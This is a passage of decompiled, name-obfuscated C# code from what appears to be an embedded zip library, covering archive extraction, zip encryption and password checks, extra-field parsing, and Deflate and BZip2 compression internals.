				gClass.string_2 = Class6.smethod_102(array);
			}
			else
			{
				gClass.string_2 = Class6.smethod_408(encoding, array);
			}
		}
		return gClass;
	}

	static void smethod_488(Class54 class54_0, Socket socket_0)
	{
		if (socket_0 == null)
		{
			throw new ArgumentNullException();
		}
		class54_0.socket_0 = socket_0;
	}

	static void smethod_489(GClass1.Class27 class27_0)
	{
		class27_0.int_0 = -1;
		((IDisposable)class27_0.enumerator_0).Dispose();
	}

	static int smethod_490(Stream stream_0, GClass3 gclass3_0)
	{
		return Class6.smethod_138(stream_0, gclass3_0, (Stream)null);
	}

	static void smethod_491(ICollection<GClass0> icollection_0)
	{
		foreach (GClass0 item in icollection_0)
		{
			Class6.smethod_600(item);
		}
	}

	static void smethod_492(Stream12 stream12_0)
	{
		if (Class6.smethod_209(stream12_0) != null)
		{
			if (stream12_0.enum22_0 == Enum22.const_0)
			{
				Class6.smethod_591(stream12_0.gclass2_0);
			}
			else
			{
				Class6.smethod_394(stream12_0.gclass2_0);
			}
			stream12_0.gclass2_0 = null;
		}
	}

	static void smethod_493(short[] short_0, int int_0, Class38 class38_0)
	{
		int num = -1;
		int num2 = short_0[1];
		int num3 = 0;
		int num4 = 7;
		int num5 = 4;
		if (num2 == 0)
		{
			num4 = 138;
			num5 = 3;
		}
		for (int i = 0; i <= int_0; i++)
		{
			int num6 = num2;
			num2 = short_0[(i + 1) * 2 + 1];
			if (++num3 < num4 && num6 == num2)
			{
				continue;
			}
			if (num3 < num5)
			{
				do
				{
					Class6.smethod_675(class38_0, num6, class38_0.short_4);
				}
				while (--num3 != 0);
			}
			else if (num6 != 0)
			{
				if (num6 != num)
				{
					Class6.smethod_675(class38_0, num6, class38_0.short_4);
					num3--;
				}
				Class6.smethod_675(class38_0, Class48.int_7, class38_0.short_4);
				Class6.smethod_465(class38_0, num3 - 3, 2);
			}
			else if (num3 <= 10)
			{
				Class6.smethod_675(class38_0, Class48.int_8, class38_0.short_4);
				Class6.smethod_465(class38_0, num3 - 3, 3);
			}
			else
			{
				Class6.smethod_675(class38_0, Class48.int_9, class38_0.short_4);
				Class6.smethod_465(class38_0, num3 - 11, 7);
			}
			num3 = 0;
			num = num6;
			if (num2 == 0)
			{
				num4 = 138;
				num5 = 3;
			}
			else if (num6 == num2)
			{
				num4 = 6;
				num5 = 3;
			}
			else
			{
				num4 = 7;
				num5 = 4;
			}
		}
	}

	static void smethod_494(GClass1 gclass1_0, GClass0 gclass0_0)
	{
		EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
		if (eventHandler_ != null)
		{
			string archiveNameForEvent = gclass1_0.ArchiveNameForEvent;
			long position = gclass1_0.ReadStream.Position;
			long lengthOfReadStream = gclass1_0.LengthOfReadStream;
			EventArgs1 e = Class6.smethod_352(position, lengthOfReadStream, gclass0_0, archiveNameForEvent);
			eventHandler_(gclass1_0, e);
		}
	}

	static int smethod_495(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.int_2;
		}
		return class8_0.stream0_0.int_1;
	}

	static int smethod_496(Class32 class32_0, byte byte_0)
	{
		if (class32_0.int_1 == -1)
		{
			class32_0.int_1 = byte_0;
			class32_0.int_2++;
			return 1;
		}
		bool flag;
		if (class32_0.int_1 == byte_0)
		{
			if (++class32_0.int_2 > 254)
			{
				flag = Class6.smethod_659(class32_0, bool_0: false);
				class32_0.int_1 = -1;
				class32_0.int_2 = 0;
				if (!flag)
				{
					return 1;
				}
				return 2;
			}
			return 1;
		}
		if (flag = Class6.smethod_659(class32_0, bool_0: false))
		{
			class32_0.int_1 = -1;
			class32_0.int_2 = 0;
			return 0;
		}
		class32_0.int_2 = 1;
		class32_0.int_1 = byte_0;
		return 1;
	}

	static void smethod_497(string string_0, Stream stream_0, string string_1, GClass0 gclass0_0)
	{
		if (gclass0_0.class8_0 == null)
		{
			throw new BadStateException("This entry is an orphan");
		}
		if (gclass0_0.class8_0.gclass1_0 == null)
		{
			throw new InvalidOperationException("Use Extract() only with ZipFile.");
		}
		gclass0_0.class8_0.gclass1_0.method_0(bool_18: false);
		if (gclass0_0.enum0_0 != Enum0.const_3)
		{
			throw new BadStateException("You must call ZipFile.Save before calling any Extract method");
		}
		Class6.smethod_140(gclass0_0, string_1);
		gclass0_0.bool_12 = false;
		string string_2 = null;
		Stream stream = null;
		bool flag = false;
		bool flag2 = false;
		try
		{
			Class6.smethod_267(gclass0_0);
			Class6.smethod_174(gclass0_0);
			if (Class6.smethod_533(string_1, gclass0_0, stream_0, ref string_2))
			{
				Class6.smethod_288(gclass0_0, "extract dir {0}...", new object[1] { string_2 });
				Class6.smethod_20(gclass0_0, string_1);
				return;
			}
			if (string_2 != null && File.Exists(string_2))
			{
				flag = true;
				int num = Class6.smethod_46(string_1, string_2, gclass0_0);
				if (num == 2 || num == 1)
				{
					return;
				}
			}
			string text = string_0 ?? gclass0_0.string_3 ?? Class6.smethod_363(gclass0_0.class8_0);
			if (gclass0_0.enum2_1 != 0)
			{
				if (text == null)
				{
					throw new BadPasswordException();
				}
				Class6.smethod_172(gclass0_0, text);
			}
			if (string_2 != null)
			{
				Class6.smethod_288(gclass0_0, "extract file {0}...", new object[1] { string_2 });
				string_2 += ".tmp";
				string directoryName = Path.GetDirectoryName(string_2);
				if (!Directory.Exists(directoryName))
				{
					Directory.CreateDirectory(directoryName);
				}
				else if (gclass0_0.class8_0.gclass1_0 != null)
				{
					flag2 = gclass0_0.class8_0.gclass1_0.bool_12;
				}
				stream = new FileStream(string_2, FileMode.CreateNew);
			}
			else
			{
				Class6.smethod_288(gclass0_0, "extract entry {0} to stream...", new object[1] { gclass0_0.string_1 });
				stream = stream_0;
			}
			if (gclass0_0.bool_12)
			{
				return;
			}
			int int_ = Class6.smethod_240(stream, gclass0_0);
			if (gclass0_0.bool_12)
			{
				return;
			}
			Class6.smethod_453(int_, gclass0_0);
			if (string_2 != null)
			{
				stream.Close();
				stream = null;
				string text2 = string_2;
				string text3 = null;
				string_2 = text2.Substring(0, text2.Length - 4);
				if (flag)
				{
					text3 = string_2 + ".PendingOverwrite";
					File.Move(string_2, text3);
				}
				File.Move(text2, string_2);
				Class6.smethod_110(bool_0: true, gclass0_0, string_2);
				if (text3 != null && File.Exists(text3))
				{
					Class6.smethod_200(text3);
				}
				if (flag2 && gclass0_0.string_1.IndexOf('/') != -1)
				{
					string directoryName2 = Path.GetDirectoryName(gclass0_0.string_1);
					if (gclass0_0.class8_0.gclass1_0[directoryName2] == null)
					{
						Class6.smethod_110(bool_0: false, gclass0_0, Path.GetDirectoryName(string_2));
					}
				}
				if ((gclass0_0.short_0 & 0xFF00) == 2560 || (gclass0_0.short_0 & 0xFF00) == 0)
				{
					File.SetAttributes(string_2, (FileAttributes)gclass0_0.int_0);
				}
			}
			Class6.smethod_20(gclass0_0, string_1);
		}
		catch (Exception)
		{
			gclass0_0.bool_12 = true;
			throw;
		}
		finally
		{
			if (gclass0_0.bool_12 && string_2 != null)
			{
				stream?.Close();
				if (File.Exists(string_2) && !flag)
				{
					File.Delete(string_2);
				}
			}
		}
	}

	static void smethod_498(GClass0 gclass0_0)
	{
		gclass0_0.bool_4 = true;
		if (!gclass0_0.string_1.EndsWith("/"))
		{
			gclass0_0.string_1 += "/";
		}
	}

	static void smethod_499(Class38 class38_0, bool bool_0)
	{
		class38_0.bool_1 = bool_0;
	}

	static void smethod_500(string string_0, GClass1 gclass1_0)
	{
		string string_ = Class6.smethod_599(string_0, (string)null);
		GClass0 gClass = gclass1_0[string_];
		if (gClass == null)
		{
			throw new ArgumentException("The entry you specified was not found in the zip archive.");
		}
		Class6.smethod_613(gclass1_0, gClass);
	}

	static void smethod_501(string string_0, Class53 class53_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		class53_0.string_1 = string_0;
	}

	static void smethod_502(Stream0 stream0_0, bool bool_0)
	{
		stream0_0.dictionary_0.Add(stream0_0.gclass0_0.string_1, stream0_0.gclass0_0);
		stream0_0.int_0++;
		if (stream0_0.int_0 > 65534 && stream0_0.enum8_0 == Enum8.const_0)
		{
			stream0_0.bool_2 = true;
			throw new InvalidOperationException("Too many entries. Consider setting ZipOutputStream.EnableZip64.");
		}
		Class6.smethod_290(stream0_0.gclass0_0, stream0_0.stream_0, bool_0 ? 99 : 0);
		Class6.smethod_425(stream0_0.gclass0_0);
		if (!stream0_0.gclass0_0.bool_4)
		{
			GClass0 gclass0_ = stream0_0.gclass0_0;
			Stream stream_ = stream0_0.stream_0;
			Class6.smethod_511(stream_, gclass0_);
			Class6.smethod_344(stream0_0.gclass0_0, stream0_0.stream_0, (long)((!bool_0) ? (-1) : 0), out stream0_0.stream4_0, out stream0_0.stream_1, out stream0_0.stream_2, ref stream0_0.stream13_0);
		}
		stream0_0.bool_5 = false;
	}

	static int smethod_503(byte[] byte_0, Class38 class38_0)
	{
		int num = byte_0.Length;
		int sourceIndex = 0;
		if (byte_0 != null && class38_0.int_19 == Class38.int_3)
		{
			class38_0.gclass2_0.uint_0 = Class6.smethod_439(class38_0.gclass2_0.uint_0, byte_0, 0, byte_0.Length);
			if (num < Class38.int_14)
			{
				return 0;
			}
			if (num > class38_0.int_23 - Class38.int_16)
			{
				num = class38_0.int_23 - Class38.int_16;
				sourceIndex = byte_0.Length - num;
			}
			Array.Copy(byte_0, sourceIndex, class38_0.byte_1, 0, num);
			class38_0.int_36 = num;
			class38_0.int_32 = num;
			class38_0.int_27 = class38_0.byte_1[0] & 0xFF;
			class38_0.int_27 = ((class38_0.int_27 << class38_0.int_31) ^ (class38_0.byte_1[1] & 0xFF)) & class38_0.int_30;
			for (int i = 0; i <= num - Class38.int_14; i++)
			{
				class38_0.int_27 = ((class38_0.int_27 << class38_0.int_31) ^ (class38_0.byte_1[i + (Class38.int_14 - 1)] & 0xFF)) & class38_0.int_30;
				class38_0.short_0[i & class38_0.int_25] = class38_0.short_1[class38_0.int_27];
				class38_0.short_1[class38_0.int_27] = (short)i;
			}
			return 0;
		}
		throw new GException0("Stream error.");
	}

	static uint smethod_504(Stream stream_0)
	{
		return (uint)Class6.smethod_568(stream_0);
	}

	static byte[] smethod_505(byte[] byte_0, int int_0, Class21 class21_0)
	{
		if (byte_0 == null)
		{
			throw new ArgumentNullException("cipherText");
		}
		if (int_0 > byte_0.Length)
		{
			throw new ArgumentOutOfRangeException("length", "Bad length during Decryption: the length parameter must be smaller than or equal to the size of the destination array.");
		}
		byte[] array = new byte[int_0];
		for (int i = 0; i < int_0; i++)
		{
			byte b = (byte)(byte_0[i] ^ Class6.smethod_189(class21_0));
			Class6.smethod_583(class21_0, b);
			array[i] = b;
		}
		return array;
	}

	static void smethod_506(GClass0 gclass0_0, Stream stream_0)
	{
		byte[] array = new byte[gclass0_0.BufferSize];
		Stream4 stream = new Stream4(gclass0_0.ArchiveStream);
		stream.Seek(gclass0_0.long_4, SeekOrigin.Begin);
		if (gclass0_0.long_6 == 0L)
		{
			gclass0_0.long_6 = gclass0_0.int_3 + gclass0_0.long_1 + gclass0_0.int_4;
		}
		Stream4 stream2 = stream_0 as Stream4;
		gclass0_0.long_4 = ((stream2 != null) ? Class6.smethod_452(stream2) : stream_0.Position);
		long num = gclass0_0.long_6;
		while (num > 0L)
		{
			int count = (int)((num > array.Length) ? array.Length : num);
			int num2 = stream.Read(array, 0, count);
			stream_0.Write(array, 0, num2);
			num -= num2;
			long long_ = stream.long_1;
			long long_2 = gclass0_0.long_6;
			Class6.smethod_78(long_, gclass0_0, long_2);
			if (gclass0_0.bool_12)
			{
				break;
			}
		}
	}

	static void smethod_507(Enum3 enum3_0, string string_0, GClass1 gclass1_0, string string_1, string string_2)
	{
		foreach (GClass0 item in Class6.smethod_76(string_1, string_2, gclass1_0))
		{
			item.Password = gclass1_0.string_3;
			Class6.smethod_611(enum3_0, item, string_0);
		}
	}

	static Class19 smethod_508(int int_0, string string_0, Stream stream_0)
	{
		Class19 @class = new Class19(string_0, int_0);
		int num = @class.int_0 / 8 / 2;
		@class.byte_0 = new byte[num];
		@class.byte_1 = new byte[2];
		stream_0.Read(@class.byte_0, 0, @class.byte_0.Length);
		stream_0.Read(@class.byte_1, 0, @class.byte_1.Length);
		@class.short_0 = (short)(@class.byte_1[0] + @class.byte_1[1] * 256);
		if (string_0 != null)
		{
			@class.short_1 = (short)(Class6.smethod_257(@class)[0] + Class6.smethod_257(@class)[1] * 256);
			if (@class.short_1 != @class.short_0)
			{
				throw new BadPasswordException("bad password");
			}
		}
		return @class;
	}

	static uint smethod_509(Exception exception_0)
	{
		return (uint)Marshal.GetHRForException(exception_0);
	}

	static void smethod_510(GClass1 gclass1_0)
	{
		StringComparer comparer = (gclass1_0.bool_0 ? StringComparer.Ordinal : StringComparer.OrdinalIgnoreCase);
		gclass1_0.dictionary_0 = ((gclass1_0.dictionary_0 == null) ? new Dictionary<string, GClass0>(comparer) : new Dictionary<string, GClass0>(gclass1_0.dictionary_0, comparer));
	}

	static void smethod_511(Stream stream_0, GClass0 gclass0_0)
	{
		if (gclass0_0.enum2_0 == Enum2.const_0)
		{
			return;
		}
		string text = gclass0_0.string_3;
		if (gclass0_0.enum0_0 == Enum0.const_3 && text == null)
		{
			text = Class6.smethod_363(gclass0_0.class8_0);
		}
		if (text == null)
		{
			gclass0_0.class21_1 = null;
			gclass0_0.class19_1 = null;
		}
		else if (gclass0_0.enum2_0 == Enum2.const_1)
		{
			gclass0_0.class21_1 = Class6.smethod_536(text);
			Random random = new Random();
			byte[] array = new byte[12];
			random.NextBytes(array);
			if ((gclass0_0.short_7 & 8) == 8)
			{
				gclass0_0.int_1 = Class6.smethod_579(gclass0_0.LastModified);
				array[11] = (byte)((uint)(gclass0_0.int_1 >> 8) & 0xFFu);
			}
			else
			{
				Class6.smethod_646(gclass0_0);
				array[11] = (byte)((uint)(gclass0_0.int_2 >> 24) & 0xFFu);
			}
			byte[] array2 = Class6.smethod_300(gclass0_0.class21_1, array, array.Length);
			stream_0.Write(array2, 0, array2.Length);
			gclass0_0.int_3 += array2.Length;
		}
		else if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
		{
			int int_ = Class6.smethod_222(gclass0_0.enum2_0);
			gclass0_0.class19_1 = Class6.smethod_358(text, int_);
			stream_0.Write(gclass0_0.class19_1.byte_0, 0, gclass0_0.class19_1.byte_0.Length);
			stream_0.Write(Class6.smethod_257(gclass0_0.class19_1), 0, Class6.smethod_257(gclass0_0.class19_1).Length);
			gclass0_0.int_3 += gclass0_0.class19_1.byte_0.Length + Class6.smethod_257(gclass0_0.class19_1).Length;
		}
	}

	static void smethod_512(Stream6 stream6_0)
	{
		if (stream6_0.int_10 <= stream6_0.int_0)
		{
			stream6_0.int_9 = stream6_0.int_8;
			int num = stream6_0.class34_0.byte_5[stream6_0.int_14] & 0xFF;
			stream6_0.int_14 = stream6_0.class34_0.int_6[stream6_0.int_14];
			if (stream6_0.int_12 == 0)
			{
				stream6_0.int_12 = Class6.smethod_191(stream6_0.int_13) - 1;
				if (++stream6_0.int_13 == 512)
				{
					stream6_0.int_13 = 0;
				}
			}
			else
			{
				stream6_0.int_12--;
			}
			num = (stream6_0.int_8 = num ^ ((stream6_0.int_12 == 1) ? 1 : 0));
			stream6_0.int_10++;
			stream6_0.int_6 = num;
			stream6_0.enum11_0 = Stream6.Enum11.const_3;
			Class6.smethod_328((byte)num, stream6_0.gclass3_0);
		}
		else
		{
			Class6.smethod_316(stream6_0);
			Class6.smethod_404(stream6_0);
			Class6.smethod_397(stream6_0);
		}
	}

	static void smethod_513(Class40 class40_0)
	{
		Class6.smethod_195(class40_0);
		class40_0.byte_0 = null;
		class40_0.int_10 = null;
	}

	static void smethod_514(Class38 class38_0)
	{
		for (int i = 0; i < Class48.int_5; i++)
		{
			class38_0.short_2[i * 2] = 0;
		}
		for (int j = 0; j < Class48.int_2; j++)
		{
			class38_0.short_3[j * 2] = 0;
		}
		for (int k = 0; k < Class48.int_1; k++)
		{
			class38_0.short_4[k * 2] = 0;
		}
		class38_0.short_2[Class38.int_18 * 2] = 1;
		class38_0.int_48 = 0;
		class38_0.int_47 = 0;
		class38_0.int_49 = 0;
		class38_0.int_45 = 0;
	}

	static Class52 smethod_515(Class53 class53_0)
	{
		return class53_0.class52_0;
	}

	static void smethod_516(Stream6 stream6_0)
	{
		if (stream6_0.int_8 != stream6_0.int_9)
		{
			stream6_0.enum11_0 = Stream6.Enum11.const_2;
			stream6_0.int_7 = 1;
			Class6.smethod_512(stream6_0);
		}
		else if (++stream6_0.int_7 >= 4)
		{
			stream6_0.char_0 = (char)(stream6_0.class34_0.byte_5[stream6_0.int_14] & 0xFFu);
			stream6_0.int_14 = stream6_0.class34_0.int_6[stream6_0.int_14];
			if (stream6_0.int_12 == 0)
			{
				stream6_0.int_12 = Class6.smethod_191(stream6_0.int_13) - 1;
				if (++stream6_0.int_13 == 512)
				{
					stream6_0.int_13 = 0;
				}
			}
			else
			{
				stream6_0.int_12--;
			}
			stream6_0.int_11 = 0;
			stream6_0.enum11_0 = Stream6.Enum11.const_4;
			if (stream6_0.int_12 == 1)
			{
				stream6_0.char_0 ^= '\u0001';
			}
			Class6.smethod_329(stream6_0);
		}
		else
		{
			stream6_0.enum11_0 = Stream6.Enum11.const_2;
			Class6.smethod_512(stream6_0);
		}
	}

	static StringDictionary smethod_517(Class61 class61_0)
	{
		return class61_0.stringDictionary_0;
	}

	static int smethod_518(short short_0, GClass0 gclass0_0, Stream stream_0)
	{
		int num = 0;
		if (short_0 > 0)
		{
			byte[] array = (gclass0_0.byte_1 = new byte[short_0]);
			num = stream_0.Read(array, 0, array.Length);
			long long_ = stream_0.Position - num;
			int num2 = 0;
			while (num2 + 3 < array.Length)
			{
				int num3 = num2;
				ushort num4 = (ushort)(array[num2++] + array[num2++] * 256);
				short num5 = (short)(array[num2++] + array[num2++] * 256);
				switch (num4)
				{
				case 10:
					num2 = Class6.smethod_280(gclass0_0, array, num2, num5, long_);
					break;
				case 1:
					num2 = Class6.smethod_186(gclass0_0, array, num2, num5, long_);
					break;
				case 21589:
					num2 = Class6.smethod_373(gclass0_0, array, num2, num5, long_);
					break;
				case 23:
					num2 = Class6.smethod_461(gclass0_0, array, num2);
					break;
				case 22613:
					num2 = Class6.smethod_398(gclass0_0, array, num2, num5, long_);
					break;
				case 39169:
					num2 = Class6.smethod_670(gclass0_0, array, num2, num5, long_);
					break;
				}
				num2 = num3 + num5 + 4;
			}
		}
		return num;
	}

	static byte smethod_519(byte byte_0)
	{
		uint num = (uint)(byte_0 * 131586);
		uint num2 = num & 0x1044010u;
		uint num3 = (num << 2) & 0x2088020u;
		return (byte)(16781313 * (num2 + num3) >> 24);
	}

	static void smethod_520(DateTime dateTime_0, DateTime dateTime_1, DateTime dateTime_2, GClass0 gclass0_0)
	{
		gclass0_0.bool_0 = true;
		if (dateTime_0 == GClass0.dateTime_6 && dateTime_0.Kind == GClass0.dateTime_6.Kind)
		{
			dateTime_0 = GClass0.dateTime_5;
		}
		if (dateTime_2 == GClass0.dateTime_6 && dateTime_2.Kind == GClass0.dateTime_6.Kind)
		{
			dateTime_2 = GClass0.dateTime_5;
		}
		if (dateTime_1 == GClass0.dateTime_6 && dateTime_1.Kind == GClass0.dateTime_6.Kind)
		{
			dateTime_1 = GClass0.dateTime_5;
		}
		gclass0_0.dateTime_3 = dateTime_0.ToUniversalTime();
		gclass0_0.dateTime_2 = dateTime_2.ToUniversalTime();
		gclass0_0.dateTime_1 = dateTime_1.ToUniversalTime();
		gclass0_0.dateTime_0 = gclass0_0.dateTime_1;
		if (!gclass0_0.bool_2 && !gclass0_0.bool_1)
		{
			gclass0_0.bool_1 = true;
		}
		gclass0_0.bool_6 = true;
	}

	static void smethod_521(Stream1 stream1_0)
	{
		stream1_0.stream13_0 = Class6.smethod_176(stream1_0.gclass0_0, stream1_0.string_0);
		stream1_0.long_0 = stream1_0.stream13_0.Length;
		stream1_0.bool_0 = false;
	}

	static void smethod_522(GClass1 gclass1_0)
	{
		EventHandler<EventArgs1> eventHandler_ = gclass1_0.eventHandler_1;
		if (eventHandler_ != null)
		{
			EventArgs1 e = Class6.smethod_3(gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, e);
		}
	}

	static int smethod_523(GClass2 gclass2_0)
	{
		return Class6.smethod_28(gclass2_0.int_4, gclass2_0);
	}

	static bool smethod_524(string string_0, string string_1)
	{
		bool result = false;
		try
		{
			using (GClass1 gClass = Class6.smethod_419(string_1))
			{
				using IEnumerator<GClass0> enumerator = gClass.System_002ECollections_002EGeneric_002EIEnumerable_003Cns5_002EGClass0_003E_002EGetEnumerator();
				while (enumerator.MoveNext())
				{
					GClass0 current = enumerator.Current;
					if (!current.bool_4 && current.enum2_1 != 0)
					{
						Class6.smethod_80(string_0, current, Stream.Null);
					}
				}
			}
			result = true;
			return result;
		}
		catch (BadPasswordException)
		{
			return result;
		}
	}

	static void smethod_525(Stream11 stream11_0)
	{
		stream11_0.queue_0 = new Queue<int>();
		stream11_0.queue_1 = new Queue<int>();
		stream11_0.list_0 = new List<Class45>();
		int val = Stream11.int_1 * Environment.ProcessorCount;
		val = Math.Min(val, stream11_0.int_2);
		for (int i = 0; i < val; i++)
		{
			stream11_0.list_0.Add(new Class45(stream11_0.int_3, stream11_0.enum20_0, stream11_0.method_0(), i));
			stream11_0.queue_1.Enqueue(i);
		}
		stream11_0.autoResetEvent_0 = new AutoResetEvent(initialState: false);
		stream11_0.gclass3_0 = new GClass3();
		stream11_0.int_4 = -1;
		stream11_0.int_5 = -1;
		stream11_0.int_6 = -1;
		stream11_0.int_7 = -1;
	}

	static int smethod_526(int int_0, Class40 class40_0, Class42 class42_0)
	{
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		GClass2 gclass2_ = class40_0.gclass2_0;
		num3 = gclass2_.int_0;
		int num4 = gclass2_.int_1;
		num = class40_0.int_9;
		num2 = class40_0.int_8;
		int num5 = class40_0.int_13;
		int num6 = ((num5 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
		while (true)
		{
			switch (class42_0.int_0)
			{
			case 6:
				if (num6 == 0)
				{
					if (num5 == class40_0.int_11 && class40_0.int_12 != 0)
					{
						num5 = 0;
						num6 = ((0 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
					}
					if (num6 == 0)
					{
						class40_0.int_13 = num5;
						int_0 = Class6.smethod_639(class40_0, int_0);
						num5 = class40_0.int_13;
						num6 = ((num5 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
						if (num5 == class40_0.int_11 && class40_0.int_12 != 0)
						{
							num5 = 0;
							num6 = ((0 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
						}
						if (num6 == 0)
						{
							class40_0.int_9 = num;
							class40_0.int_8 = num2;
							gclass2_.int_1 = num4;
							gclass2_.long_0 += num3 - gclass2_.int_0;
							gclass2_.int_0 = num3;
							class40_0.int_13 = num5;
							return Class6.smethod_639(class40_0, int_0);
						}
					}
				}
				int_0 = 0;
				class40_0.byte_0[num5++] = (byte)class42_0.int_5;
				num6--;
				class42_0.int_0 = 0;
				break;
			case 5:
			{
				int i;
				for (i = num5 - class42_0.int_7; i < 0; i += class40_0.int_11)
				{
				}
				while (class42_0.int_1 != 0)
				{
					if (num6 == 0)
					{
						if (num5 == class40_0.int_11 && class40_0.int_12 != 0)
						{
							num5 = 0;
							num6 = ((0 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
						}
						if (num6 == 0)
						{
							class40_0.int_13 = num5;
							int_0 = Class6.smethod_639(class40_0, int_0);
							num5 = class40_0.int_13;
							num6 = ((num5 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
							if (num5 == class40_0.int_11 && class40_0.int_12 != 0)
							{
								num5 = 0;
								num6 = ((0 < class40_0.int_12) ? (class40_0.int_12 - num5 - 1) : (class40_0.int_11 - num5));
							}
							if (num6 == 0)
							{
								class40_0.int_9 = num;
								class40_0.int_8 = num2;
								gclass2_.int_1 = num4;
								gclass2_.long_0 += num3 - gclass2_.int_0;
								gclass2_.int_0 = num3;
								class40_0.int_13 = num5;
								return Class6.smethod_639(class40_0, int_0);
							}
						}
					}
					class40_0.byte_0[num5++] = class40_0.byte_0[i++];
					num6--;
					if (i == class40_0.int_11)
					{
						i = 0;
					}
					class42_0.int_1--;
				}
				class42_0.int_0 = 0;
				break;
			}
			case 4:
			{
				int int_;
				for (int_ = class42_0.int_6; num2 < int_; num2 += 8)
				{
					if (num4 != 0)
					{
						int_0 = 0;
						num4--;
						num |= (gclass2_.byte_0[num3++] & 0xFF) << num2;
						continue;
					}
					class40_0.int_9 = num;
					class40_0.int_8 = num2;
					gclass2_.int_1 = num4;
					gclass2_.long_0 += num3 - gclass2_.int_0;
					gclass2_.int_0 = num3;
					class40_0.int_13 = num5;
					return Class6.smethod_639(class40_0, int_0);
				}
				class42_0.int_7 += num & Class41.int_0[int_];
				num >>= int_;
				num2 -= int_;
				class42_0.int_0 = 5;
				goto case 5;
			}
			case 3:
			{
				int int_;
				for (int_ = class42_0.int_4; num2 < int_; num2 += 8)
				{
					if (num4 != 0)
					{
						int_0 = 0;
						num4--;
						num |= (gclass2_.byte_0[num3++] & 0xFF) << num2;
						continue;
					}
					class40_0.int_9 = num;
					class40_0.int_8 = num2;
					gclass2_.int_1 = num4;
					gclass2_.long_0 += num3 - gclass2_.int_0;
					gclass2_.int_0 = num3;
					class40_0.int_13 = num5;
					return Class6.smethod_639(class40_0, int_0);
				}
				int num7 = (class42_0.int_3 + (num & Class41.int_0[int_])) * 3;
				num >>= class42_0.int_2[num7 + 1];
				num2 -= class42_0.int_2[num7 + 1];
				int num8 = class42_0.int_2[num7];
				if (((uint)num8 & 0x10u) != 0)
				{
					class42_0.int_6 = num8 & 0xF;
					class42_0.int_7 = class42_0.int_2[num7 + 2];
					class42_0.int_0 = 4;
					break;
				}
				if ((num8 & 0x40) == 0)
				{
					class42_0.int_4 = num8;
					class42_0.int_3 = num7 / 3 + class42_0.int_2[num7 + 2];
					break;
				}
				class42_0.int_0 = 9;
				gclass2_.string_0 = "invalid distance code";
				int_0 = -3;
				class40_0.int_9 = num;
				class40_0.int_8 = num2;
				gclass2_.int_1 = num4;
				gclass2_.long_0 += num3 - gclass2_.int_0;
				gclass2_.int_0 = num3;
				class40_0.int_13 = num5;
				return Class6.smethod_639(class40_0, -3);
			}
			case 2:
			{
				int int_;
				for (int_ = class42_0.int_6; num2 < int_; num2 += 8)
				{
					if (num4 != 0)
					{
						int_0 = 0;
						num4--;
						num |= (gclass2_.byte_0[num3++] & 0xFF) << num2;
						continue;
					}
					class40_0.int_9 = num;
					class40_0.int_8 = num2;
					gclass2_.int_1 = num4;
					gclass2_.long_0 += num3 - gclass2_.int_0;
					gclass2_.int_0 = num3;
					class40_0.int_13 = num5;
					return Class6.smethod_639(class40_0, int_0);
				}
				class42_0.int_1 += num & Class41.int_0[int_];
				num >>= int_;
				num2 -= int_;
				class42_0.int_4 = class42_0.byte_1;
				class42_0.int_2 = class42_0.int_10;
				class42_0.int_3 = class42_0.int_11;
				class42_0.int_0 = 3;
				goto case 3;
			}
			case 1:
			{
				int int_;
				for (int_ = class42_0.int_4; num2 < int_; num2 += 8)
				{
					if (num4 != 0)
					{
						int_0 = 0;
						num4--;
						num |= (gclass2_.byte_0[num3++] & 0xFF) << num2;
						continue;
					}
					class40_0.int_9 = num;
					class40_0.int_8 = num2;
					gclass2_.int_1 = num4;
					gclass2_.long_0 += num3 - gclass2_.int_0;
					gclass2_.int_0 = num3;
					class40_0.int_13 = num5;
					return Class6.smethod_639(class40_0, int_0);
				}
				int num7 = (class42_0.int_3 + (num & Class41.int_0[int_])) * 3;
				num >>= class42_0.int_2[num7 + 1];
				num2 -= class42_0.int_2[num7 + 1];
				int num8 = class42_0.int_2[num7];
				if (num8 == 0)
				{
					class42_0.int_5 = class42_0.int_2[num7 + 2];
					class42_0.int_0 = 6;
					break;
				}
				if (((uint)num8 & 0x10u) != 0)
				{
					class42_0.int_6 = num8 & 0xF;
					class42_0.int_1 = class42_0.int_2[num7 + 2];
					class42_0.int_0 = 2;
					break;
				}
				if ((num8 & 0x40) == 0)
				{
					class42_0.int_4 = num8;
					class42_0.int_3 = num7 / 3 + class42_0.int_2[num7 + 2];
					break;
				}
				if (((uint)num8 & 0x20u) != 0)
				{
					class42_0.int_0 = 7;
					break;
				}
				class42_0.int_0 = 9;
				gclass2_.string_0 = "invalid literal/length code";
				int_0 = -3;
				class40_0.int_9 = num;
				class40_0.int_8 = num2;
				gclass2_.int_1 = num4;
				gclass2_.long_0 += num3 - gclass2_.int_0;
				gclass2_.int_0 = num3;
				class40_0.int_13 = num5;
				return Class6.smethod_639(class40_0, -3);
			}
			case 0:
				if (num6 >= 258 && num4 >= 10)
				{
					class40_0.int_9 = num;
					class40_0.int_8 = num2;
					gclass2_.int_1 = num4;
					gclass2_.long_0 += num3 - gclass2_.int_0;
					gclass2_.int_0 = num3;
					class40_0.int_13 = num5;
					int byte_ = class42_0.byte_0;
					int byte_2 = class42_0.byte_1;
					int[] int_2 = class42_0.int_8;
					int int_3 = class42_0.int_9;
					int[] int_4 = class42_0.int_10;
					int int_5 = class42_0.int_11;
					int_0 = Class6.smethod_572(class40_0, int_4, int_3, gclass2_, int_5, class42_0, int_2, byte_2, byte_);
					num3 = gclass2_.int_0;
					num4 = gclass2_.int_1;
					num = class40_0.int_9;
					num2 = class40_0.int_8;
					num5 = class40_0.int_13;
